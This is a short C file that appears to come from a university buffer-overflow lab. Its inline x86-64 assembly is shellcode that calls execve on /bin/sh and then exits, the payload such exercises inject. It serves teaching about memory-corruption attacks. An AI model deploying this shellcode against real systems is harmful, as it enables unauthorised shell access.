/* victim.c */
/* Author: Zecheng He @ Princeton University */
/* Modified from https://github.com/npapernot/buffer-overflow-attack to support 64-bit machines*/

#include <sys/syscall.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>


int main(int argc, char **argv)
{
    __asm(
        "movq    $file_to_run, %rcx\n"
        "movq    $59, %rax\n"                /* syscall arg 1: syscall number execve(59) */
        "movq    %rcx, %rdi\n"               /* syscall arg 2: string pathname */
        "leaq    8(%rcx), %rsi\n"            /* syscall arg 3: argv ptr to ['/bin/sh']*/
        "movq    $0, %rdx\n"                 /* syscall arg 4: envp (NULL) */
        "syscall\n"                          /* Call execve("/bin/sh", ["/bin/sh"], []) */

        "movq    $60, %rax\n"                /* syscall arg 1: SYS_exit (60) */
        "xorq    %rdi,%rdi\n"                /* syscall arg 2: 0 */
        "syscall\n"                          /* invoke syscall */

        "file_to_run:\n"
        ".ascii  \"/bin/sh\\0\"\n"
        ".quad   file_to_run\n"
        ".quad   0x0\n"
    );

    //execv("/bin/sh", NULL, NULL);
}
